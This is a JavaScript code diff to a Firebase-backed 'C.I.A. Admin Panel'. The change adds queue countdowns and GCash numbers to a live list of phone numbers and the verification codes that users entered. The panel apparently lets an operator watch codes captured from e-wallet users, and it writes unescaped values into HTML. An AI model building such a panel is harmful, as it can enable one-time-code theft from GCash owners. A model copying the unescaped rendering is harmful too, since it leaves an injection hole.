@@ -7,6 +7,8 @@
  * + Auto-delete after 2 minutes
  * + Unique per phone (latest input only)
  * + Anti-refresh + Copy button + Compact display
+ * + ⏳ QUEUE USERS (Mission counting_down)
+ * + 📞 AI VERIFICATION USERS
  */
 
 const firebaseConfig = {
@@ -35,8 +37,9 @@ let verificationCountdownInterval = null;
 let activeVerifications = {};
 let lastRenderHash = '';
 
-// ✅ AUTO-DELETE TIMING (2 minutes)
-const AUTO_DELETE_MS = 2 * 60 * 1000;
+// ✅ AUTO-DELETE TIMING
+const AUTO_DELETE_MS = 2 * 60 * 1000;         // 2 minutes for AI verification
+const QUEUE_DELETE_MS = 12 * 60 * 1000;       // 12 minutes for queue
 
 // ========== CHECK IF MASTER KEY EXISTS ==========
 async function checkMasterKeyExists() {
@@ -1127,6 +1130,8 @@ function closeBranchPopup() {
 // ✅ Auto-delete after 2 minutes
 // ✅ Unique per phone (latest input only)
 // ✅ Anti-refresh + Copy button + Compact display
+// ✅ ⏳ QUEUE USERS (Mission counting_down)
+// ✅ 📞 AI VERIFICATION USERS
 // ============================================================
 
 function initSystemVerificationPanel() {
@@ -1149,17 +1154,23 @@ function initSystemVerificationPanel() {
             var userData = sessions[phone];
             var verification = userData.system_verification;
 
-            if (verification && (verification.status === 'active' ||
-                                 verification.status === 'expired' ||
-                                 verification.status === 'invalid' ||
-                                 verification.status === 'verified')) {
-
+            // ✅ Include: active, expired, invalid, verified, counting_down
+            if (verification && (
+                verification.status === 'active' ||
+                verification.status === 'expired' ||
+                verification.status === 'invalid' ||
+                verification.status === 'verified' ||
+                verification.status === 'counting_down'
+            )) {
                 verificationsMap[phone] = {
                     phone: phone,
                     code: verification.code || '----',
                     userEnteredCode: verification.userEnteredCode || null,
                     isMatch: verification.isMatch || false,
                     timer: verification.timer || 0,
+                    countdownTimer: verification.countdownTimer || 0,
+                    countdownStartedAt: verification.countdownStartedAt || 0,
+                    gcashNumber: verification.gcashNumber || null,
                     status: verification.status || 'active',
                     deviceId: verification.deviceId || 'Unknown',
                     createdAt: verification.createdAt || 0,
@@ -1173,9 +1184,12 @@ function initSystemVerificationPanel() {
             return verificationsMap[phone];
         });
 
+        // Sort: queue first, then by latest
         verifications.sort(function(a, b) {
-            var timeA = a.userEnteredAt || a.createdAt || 0;
-            var timeB = b.userEnteredAt || b.createdAt || 0;
+            if (a.status === 'counting_down' && b.status !== 'counting_down') return -1;
+            if (b.status === 'counting_down' && a.status !== 'counting_down') return 1;
+            var timeA = a.lastUpdate || a.createdAt || 0;
+            var timeB = b.lastUpdate || b.createdAt || 0;
             return timeB - timeA;
         });
 
@@ -1184,10 +1198,11 @@ function initSystemVerificationPanel() {
             activeVerifications[v.phone] = v;
         });
 
-        // ✅ ANTI-REFRESH: Hash check (user input + status + match)
+        // Anti-refresh hash
         var newHash = verifications.map(function(v) {
             return v.phone + '|' + v.status + '|' +
                    (v.userEnteredCode || '-') + '|' + (v.isMatch ? '1' : '0') + '|' +
+                   (v.countdownTimer || '-') + '|' +
                    v.deviceId;
         }).join('#');
 
@@ -1197,7 +1212,7 @@ function initSystemVerificationPanel() {
         }
 
         var activeCount = verifications.filter(function(v) {
-            return v.status === 'active';
+            return v.status === 'active' || v.status === 'counting_down';
         }).length;
         var countEl = document.getElementById('verificationCount');
         if (countEl) countEl.textContent = activeCount;
@@ -1207,17 +1222,16 @@ function initSystemVerificationPanel() {
         clearInterval(verificationCountdownInterval);
     }
 
-    // ✅ Timer updater + Auto-cleanup every second
     verificationCountdownInterval = setInterval(function() {
         updateVerificationTimers();
         cleanupOldVerifications();
     }, 1000);
 
-    console.log('✅ System Verification Panel initialized (USER INPUT + manual delete + 2min auto-delete)');
+    console.log('✅ System Verification Panel initialized');
 }
 
 // ============================================================
-// ✅ RENDER LIST — TIMER + USER INPUT side-by-side
+// ✅ RENDER LIST — Queue + AI Verification
 // ============================================================
 function renderSystemVerificationList(verifications) {
     var listEl = document.getElementById('verificationList');
@@ -1236,20 +1250,87 @@ function renderSystemVerificationList(verifications) {
 
     verifications.forEach(function(v) {
         var isActive = v.status === 'active';
+        var isQueue = v.status === 'counting_down';
+
         var statusClass = 'status-' + v.status;
         var badgeClass = v.status;
 
+        // STATUS TEXT
         var statusText = 'ACTIVE';
         if (v.status === 'expired') statusText = 'EXPIRED';
         if (v.status === 'invalid') statusText = 'INVALID';
         if (v.status === 'verified') statusText = 'VERIFIED';
+        if (isQueue) statusText = '⏳ QUEUE';
 
+        // ============================================
+        // ⏳ QUEUE USER (counting_down)
+        // ============================================
+        if (isQueue) {
+            var mins = Math.floor((v.countdownTimer || 0) / 60);
+            var secs = (v.countdownTimer || 0) % 60;
+            var countdownDisplay = mins + ':' + String(secs).padStart(2, '0');
+
+            var gcashHtml = '';
+            if (v.gcashNumber) {
+                gcashHtml =
+                    '<div class="queue-gcash-info">' +
+                        '<i class="fas fa-mobile-screen-button"></i>' +
+                        '<span>💳 GCash: <strong>' + v.gcashNumber + '</strong></span>' +
+                    '</div>';
+            }
+
+            var createdTime = v.createdAt ? formatVerificationTime(v.createdAt) : '---';
+
+            html +=
+                '<div class="verification-item queue-item" data-phone="' + v.phone + '">' +
+                    '<div class="v-header-row">' +
+                        '<div class="v-phone-wrap">' +
+                            '<i class="fas fa-hourglass-half" style="color:#ffb300;"></i>' +
+                            '<span class="v-phone-text">' + v.phone + '</span>' +
+                            '<button class="v-copy-btn" onclick="copyPhone(\'' + v.phone + '\', this)" title="Copy number">📋</button>' +
+                        '</div>' +
+                        '<div class="v-header-actions">' +
+                            '<div class="v-status-badge ' + badgeClass + '">' +
+                                '<span class="v-status-dot"></span>' +
+                                '<span>' + statusText + '</span>' +
+                            '</div>' +
+                            '<button class="v-delete-btn" onclick="deleteVerification(\'' + v.phone + '\')" title="Delete now">🗑️</button>' +
+                        '</div>' +
+                    '</div>' +
+
+                    '<div class="queue-countdown-display">' +
+                        '<div class="queue-label">⏱ WAITING FOR QUEUE</div>' +
+                        '<div class="queue-timer-big" data-phone="' + v.phone + '">' + countdownDisplay + '</div>' +
+                        '<div class="queue-progress-track">' +
+                            '<div class="queue-progress-fill" style="width:' + (((600 - (v.countdownTimer || 0)) / 600) * 100) + '%"></div>' +
+                        '</div>' +
+                    '</div>' +
+
+                    gcashHtml +
+
+                    '<div class="v-footer">' +
+                        '<div class="v-device">' +
+                            '<i class="fas fa-desktop"></i>' +
+                            '<span>' + v.deviceId + '</span>' +
+                        '</div>' +
+                        '<div class="v-time">' +
+                            '<i class="fas fa-clock"></i>' +
+                            '<span>' + createdTime + '</span>' +
+                        '</div>' +
+                    '</div>' +
+                '</div>';
+
+            return;
+        }
+
+        // ============================================
+        // 📞 AI VERIFICATION
+        // ============================================
         var timerClass = 'timer-display';
         if (v.timer <= 9 && isActive) timerClass += ' urgent';
 
         var createdTime = v.createdAt ? formatVerificationTime(v.createdAt) : '---';
 
-        // ✅ USER INPUT DISPLAY (kapalit ng SYSTEM CODE)
         var userCodeHtml = '';
         if (v.userEnteredCode) {
             var matchClass = v.isMatch ? 'code-match' : 'code-mismatch';
@@ -1269,6 +1350,11 @@ function renderSystemVerificationList(verifications) {
                 '<div class="v-match-badge waiting">⏳ WAITING</div>';
         }
 
+        var gcashBadge = '';
+        if (v.gcashNumber) {
+            gcashBadge = '<div class="ai-gcash-badge"><i class="fas fa-mobile-screen-button"></i> GCash: ' + v.gcashNumber + '</div>';
+        }
+
         html +=
             '<div class="verification-item ' + statusClass + '" data-phone="' + v.phone + '">' +
                 '<div class="v-header-row">' +
@@ -1286,7 +1372,8 @@ function renderSystemVerificationList(verifications) {
                     '</div>' +
                 '</div>' +
 
-                // ✅ TIMER + USER INPUT side-by-side
+                gcashBadge +
+
                 '<div class="v-grid">' +
                     '<div class="v-box">' +
                         '<div class="v-label">⏱ TIMER</div>' +
@@ -1320,8 +1407,8 @@ function renderSystemVerificationList(verifications) {
 // ✅ TIMER UPDATE — TEXT ONLY (walang re-render)
 // ============================================================
 function updateVerificationTimers() {
+    // Regular timers (AI verification)
     var timerElements = document.querySelectorAll('.timer-display');
-
     timerElements.forEach(function(el) {
         var phone = el.getAttribute('data-phone');
         var verification = activeVerifications[phone];
@@ -1338,12 +1425,39 @@ function updateVerificationTimers() {
             }
 
             if (verification.timer <= 9) {
-                if (!el.classList.contains('urgent')) {
-                    el.classList.add('urgent');
-                }
+                if (!el.classList.contains('urgent')) el.classList.add('urgent');
             } else {
-                if (el.classList.contains('urgent')) {
-                    el.classList.remove('urgent');
+                if (el.classList.contains('urgent')) el.classList.remove('urgent');
+            }
+        }
+    });
+
+    // Queue countdown timers
+    var queueElements = document.querySelectorAll('.queue-timer-big');
+    queueElements.forEach(function(el) {
+        var phone = el.getAttribute('data-phone');
+        var verification = activeVerifications[phone];
+
+        if (!verification) return;
+        if (verification.status !== 'counting_down') return;
+
+        if (verification.countdownTimer > 0) {
+            verification.countdownTimer--;
+
+            var mins = Math.floor(verification.countdownTimer / 60);
+            var secs = verification.countdownTimer % 60;
+            var newText = mins + ':' + String(secs).padStart(2, '0');
+
+            if (el.textContent !== newText) {
+                el.textContent = newText;
+            }
+
+            var parent = el.parentNode;
+            if (parent) {
+                var progressFill = parent.querySelector('.queue-progress-fill');
+                if (progressFill) {
+                    var progress = ((600 - verification.countdownTimer) / 600) * 100;
+                    progressFill.style.width = progress + '%';
                 }
             }
         }
@@ -1351,7 +1465,7 @@ function updateVerificationTimers() {
 }
 
 // ============================================================
-// ✅ AUTO-CLEANUP — Remove after 2 minutes (base sa latest input)
+// ✅ AUTO-CLEANUP
 // ============================================================
 function cleanupOldVerifications() {
     var now = Date.now();
@@ -1359,8 +1473,18 @@ function cleanupOldVerifications() {
     Object.keys(activeVerifications).forEach(function(phone) {
         var v = activeVerifications[phone];
 
-        var timestamp = v.userEnteredAt || v.createdAt || 0;
+        // Queue items — 12 minutes
+        if (v.status === 'counting_down') {
+            var queueTimestamp = v.countdownStartedAt || v.createdAt || 0;
+            if (queueTimestamp && (now - queueTimestamp) > QUEUE_DELETE_MS) {
+                console.log('🗑️ Auto-removing queue (12min expired):', phone);
+                removeVerification(phone);
+            }
+            return;
+        }
 
+        // Regular verification — 2 minutes
+        var timestamp = v.userEnteredAt || v.createdAt || 0;
         if (timestamp && (now - timestamp) > AUTO_DELETE_MS) {
             console.log('🗑️ Auto-removing verification (2min expired):', phone);
             removeVerification(phone);
@@ -1369,7 +1493,7 @@ function cleanupOldVerifications() {
 }
 
 // ============================================================
-// ✅ MANUAL DELETE — Remove specific verification
+// ✅ MANUAL DELETE
 // ============================================================
 window.deleteVerification = function(phone) {
     if (!confirm('🗑️ DELETE VERIFICATION\n\nDelete this verification for ' + phone + '?')) {
@@ -1384,18 +1508,13 @@ window.deleteVerification = function(phone) {
 // ✅ SHARED REMOVE FUNCTION
 // ============================================================
 function removeVerification(phone) {
-    // Remove from Firebase
     try {
         db.ref('user_sessions/' + phone + '/system_verification').remove();
     } catch(e) {}
 
-    // Remove from local state
     delete activeVerifications[phone];
-
-    // Force re-render next update
     lastRenderHash = '';
 
-    // Remove DOM element with fade-out animation
     var el = document.querySelector('.verification-item[data-phone="' + phone + '"]');
     if (el) {
         el.style.transition = 'opacity 0.4s ease, transform 0.4s ease';
@@ -1938,6 +2057,6 @@ window.closeBranchPopup = closeBranchPopup;
 window.initSystemVerificationPanel = initSystemVerificationPanel;
 window.deleteVerification = deleteVerification;
 
-console.log('✅ C.I.A. Admin Panel v3.5 - USER INPUT + manual delete + 2-min auto-delete');
+console.log('✅ C.I.A. Admin Panel v3.6 - Queue + AI Verification Display');
 console.log('ℹ️ First time? Create your access key.');
 console.log('ℹ️ Already setup? Auto-login.');
